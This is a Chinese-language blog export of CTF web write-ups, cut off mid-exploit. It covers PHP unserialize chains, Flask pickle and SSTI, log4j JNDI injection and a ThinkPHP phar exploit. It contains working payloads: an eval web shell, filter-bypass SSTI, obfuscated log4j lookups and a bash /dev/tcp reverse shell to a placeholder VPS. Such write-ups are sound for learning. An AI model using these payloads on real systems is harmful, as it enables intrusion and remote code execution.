&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var1 = <span class="variable">$p1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$p1</span>, <span class="variable">$p2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p1</span>, <span class="variable">$p2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var1 = <span class="variable">$p1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var2 = <span class="variable">$p2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dir</span> = <span class="string">&quot;sandbox&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            mkdir(<span class="string">&#x27;sandbox&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        chdir(<span class="string">&#x27;sandbox&#x27;</span>);</span><br><span class="line">        <span class="variable">$filename</span> = md5(<span class="keyword">$this</span>-&gt;var1 . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]) . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[&lt;&gt;?]/&quot;</span>, <span class="keyword">$this</span>-&gt;var2)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;hhhhacker!!!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            file_put_contents(<span class="string">&quot;./&quot;</span> . <span class="variable">$filename</span>, <span class="keyword">$this</span>-&gt;var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">    unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] == <span class="string">&#x27;phpinfo&#x27;</span>) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链子很好找，<code>preg_match</code>使用数组绕过即可</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var1 = <span class="keyword">new</span> B;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var2 = <span class="keyword">new</span> C;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var1 = <span class="keyword">array</span>(<span class="keyword">new</span> D, <span class="string">&quot;write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span> = <span class="string">&#x27;ggbond&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span> = [<span class="string">&quot;shell&quot;</span>=&gt;<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>登录页面直接爆破</p><p><img src="/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E7%BB%84%E9%98%9F%E8%B5%9B)/202201101707670.png" alt="image-20220110115204244"></p><p>得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace</span>(<span class="params"><span class="variable">$payload</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span>=<span class="string">&quot;/flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&quot;nono!&quot;</span>,<span class="variable">$payload</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$sss</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ky&#x27;</span>];</span><br><span class="line"><span class="variable">$ctf</span>[<span class="string">&#x27;sss1&#x27;</span>]=<span class="string">&#x27;webwebweb&#x27;</span>;</span><br><span class="line"><span class="variable">$ctf</span>[<span class="string">&#x27;sss2&#x27;</span>]=<span class="string">&#x27;pwnpwnpwn&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$sss</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$sss</span>,<span class="string">&#x27;flag&#x27;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$ctf</span>[<span class="string">&#x27;sss1&#x27;</span>]=<span class="variable">$sss</span>;</span><br><span class="line">        <span class="variable">$ctf</span>=unserialize(replace(serialize(<span class="variable">$ctf</span>)));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ctf</span>[<span class="string">&#x27;sss2&#x27;</span>]===<span class="string">&quot;webwebweb&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化逃逸，值增长，构造<code>exp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ky=flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:4:&quot;sss2&quot;;s:9:&quot;webwebweb&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-flask"><a href="#ez-flask" class="headerlink" title="ez_flask"></a>ez_flask</h2><p>需要身份认证，看了下<code>Cookie</code>里有个<code>user</code>，查了一会发现是<code>python</code>的序列化字符串，捣鼓了半天才把<code>exp</code>捣鼓出来</p><p>app.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class User:</span><br><span class="line"></span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.vip = True</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> dumps</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">o = app.User(data)</span><br><span class="line">payload = dumps(o)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;user=&quot;</span> + <span class="built_in">str</span>(b64encode(payload))[<span class="number">2</span>:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>然后接下来直接进行<code>flaks SSTI</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.<span class="keyword">__class__</span>.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=gASVcgAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjEl7e2NvbmZpZy5fX2NsYXNzX18uX19pbml0X18uX19nbG9iYWxzX19bJ29zJ10ucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKX19lIwDdmlwlIh1Yi4=</span><br></pre></td></tr></table></figure><p>得到的<code>payload</code>放入<code>cookie</code>得到<code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长安“战疫”网络安全卫士守护赛</title>
      <link href="/post/2022-01/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
      <url>/post/2022-01/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>这次的长安“战疫”搞得还挺大的，那么多大佬都来比赛了，我摸摸鱼就好…</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h2><p>看到这么短的审计就心慌，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里第一个绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br></pre></td></tr></table></figure><p>使用了递归模式，这里的正则意思就是只能使用<code>function()</code>或<code>function1(function2())</code>，也就是不能使用参数</p><p>因为是<code>rce</code>，所以我们就是要执行系统命令，但是传不进去参数，就想着从外边引入</p><p><a href="https://www.extrader.top/posts/4f9c9406/">无参数RCE</a></p><p>因为过滤了一部分字符，我们使用<code>get_defined_vars()</code>获得变量，然后<code>reset()</code>获得<code>$_GET</code>，再次<code>reset()</code>获得第一个<code>GET</code>变量，所以传参的时候第一个变量不能是<code>code</code>，然后<code>eval()</code>执行就好。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;cat flag.php&#x27;);&amp;code=eval(reset(reset(get_defined_vars())));</span><br></pre></td></tr></table></figure><h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>到了页面说是需要登录，瞎试了一下传参，无果，源码里有这样一句话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> request.full_path.endswith(<span class="string">&quot;.js?&quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> request.full_path.startswith(<span class="string">&quot;/login&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> redirect(<span class="string">&quot;login&quot;</span>)</span><br></pre></td></tr></table></figure><p>经过本地测试，发现可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://24bacbc0.lxctf.net/admin?static.js?</span><br></pre></td></tr></table></figure><p>成功进入<code>admin</code>页面，提示<code>admin/?name=</code>，然后使用<code>/admin?name=&#123;&#123;7*7&#125;&#125;&amp;static.js?</code>进行<code>SSTI</code></p><p>经过测试发现过滤掉了一些字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__[]subclassesargsvalue</span><br></pre></td></tr></table></figure><p>我们使用十六进制或者<code>unicode</code>绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config|attr(<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;&amp;static.js?</span><br></pre></td></tr></table></figure><p><code>__getitem__</code>方法返回键对应值，<code>attr</code>过滤器获得类属性</p><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro?"></a>Shiro?</h2><ul><li><input checked disabled type="checkbox"> 登录框</li><li><input checked disabled type="checkbox"> Java</li></ul><p>试一下<code>log4j2</code>的洞呗，<code>$&#123;jndi:ladp://nn2mmc.dnslog.cn/exp&#125;</code>，发现被拦了</p><p>网上随便找个绕过<code>$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://nn2mmc.dnslog.cn/exp&#125;</code>，</p><p><img src="/post/2022-01/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/202201082029096.png" alt="image-20220108140900901"></p><p>成功回显，那这不就简单了吗？</p><p>在大师傅这里下载<code>exp</code><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>将下面<code>反弹shell</code>进行<code>base64</code> 编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后在<code>vps</code>开启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,base64编 码的反弹shell&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="string">&quot;vpsip&quot;</span></span><br></pre></td></tr></table></figure><p>然后再开一个终端进行监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure><p>然后将payload发出去，成功<code>反弹shell</code></p><p><img src="/post/2022-01/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/202201082029097.png" alt="image-20220108141340219"></p><h2 id="Flag配送中心"><a href="#Flag配送中心" class="headerlink" title="Flag配送中心"></a>Flag配送中心</h2><p><code>F12</code>提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Powered by PHP 5.6.23 + fastcgi--&gt;</span></span><br></pre></td></tr></table></figure><p>直接<code>google</code>搜<code>php5.6.23</code>的<code>fastcgi</code>漏洞</p><p><a href="https://www.cnblogs.com/ahtoh/p/15428089.html">https://www.cnblogs.com/ahtoh/p/15428089.html</a></p><p><img src="/post/2022-01/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/202201082029098.png" alt="image-20220108171518416"></p><p>在<code>vps</code>上<code>nc</code>一下就获取到<code>flag</code>了</p><h2 id="tp"><a href="#tp" class="headerlink" title="tp"></a>tp</h2><p>一开始以为没有源码，结果发现我眼睛白长了，那么几个大字就在首页<code>访问upload 方法进行文件上传</code></p><p><code>?s=index/index/upload</code>直接访问获得源码</p><p>一开始的<code>foreach</code>和下边的<code>func()</code>实现了变量覆盖，可以在本地测试一下更容易理清关系</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$var</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$var</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">            <span class="variable">$var</span>[<span class="variable">$_k</span>] = func(<span class="variable">$_v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = addslashes(<span class="variable">$var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$q</span> = [<span class="string">&quot;a&quot;</span>=&gt;[<span class="string">&quot;d&quot;</span>=&gt;<span class="number">1</span>], <span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;2&quot;</span>];</span><br><span class="line"><span class="variable">$w</span> = [<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;3&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="variable">$q</span>,<span class="variable">$w</span>) <span class="keyword">as</span> <span class="variable">$request</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$request</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        $&#123;<span class="variable">$k</span>&#125; = func(<span class="variable">$v</span>);</span><br><span class="line">        <span class="comment">//$_request[$_k] =  $&#123;$_k&#125;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>然后就是中间的那一块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="variable">$filename</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>].<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>,<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">    unlink(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;noPHP&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里实现了文件上传的功能，如果匹配到了<code>ph</code>就立刻删除文件，删除用到了<code>unlink()</code></p><p><code>unlink()</code>可以触发<code>phar://</code>伪协议，再加上又是<code>tp5</code>的框架，不难想到是反序列化攻击</p><p>网上先随便找个链子生成<code>phar文件</code>，先是找了个<code>rce</code>的链子，但是不行，就换了另一条。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span 